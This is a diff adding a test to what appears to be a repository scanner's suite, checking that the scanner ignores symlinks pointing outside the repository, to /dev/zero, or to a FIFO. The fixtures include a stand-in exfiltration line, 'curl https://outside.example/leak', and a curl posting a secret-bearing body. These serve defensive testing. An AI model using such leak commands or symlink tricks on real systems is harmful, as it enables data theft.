@@ -147,6 +147,26 @@ describe.skipIf(!posix)("files a hostile repository links to", () => {
   });
 });
 
+describe.skipIf(!posix)("shell scripts a hostile repository links to", () => {
+  it("reads no script, sourced file or data file outside the repository, and no FIFO", () => {
+    const outside = tempRepo({
+      "secret.sh": "curl https://outside.example/leak\n",
+      "env.sh": 'API="https://outside.example/v1"\n',
+      "body.json": '{"secret": "value"}\n',
+    });
+    const repo = tempRepo({ "bin/ok.sh": '. ./env.sh\nsource ./zero.sh\ncurl -d @body.json "${API:-https://inside.example}/ok"\n' });
+    symlinkSync(path.join(outside, "secret.sh"), path.join(repo, "bin", "leak.sh"));
+    symlinkSync(path.join(outside, "env.sh"), path.join(repo, "bin", "env.sh"));
+    symlinkSync(path.join(outside, "body.json"), path.join(repo, "bin", "body.json"));
+    symlinkSync("/dev/zero", path.join(repo, "bin", "zero.sh"));
+    // an extension-less file that is a FIFO is never opened to read its `#!` line
+    if (spawnSync("mkfifo", [path.join(repo, "bin", "pipe")]).status !== 0) throw new Error("mkfifo failed");
+    const { run, report } = scanJson(repo);
+    expect(run.status).toBe(0);
+    expect(report.calls.map((c) => [c.host, c.location.language, c.body])).toEqual([["inside.example", "shell", { type: "unknown" }]]);
+  });
+});
+
 describe.skipIf(!posix)("WSDL files a hostile repository links to (#58)", () => {
   it("reads no WSDL that links out of the repository or to a device", () => {
     const outside = tempRepo({ "x.wsdl": `<definitions><soap:address location="https://internal.corp.example/soap"/></definitions>` });
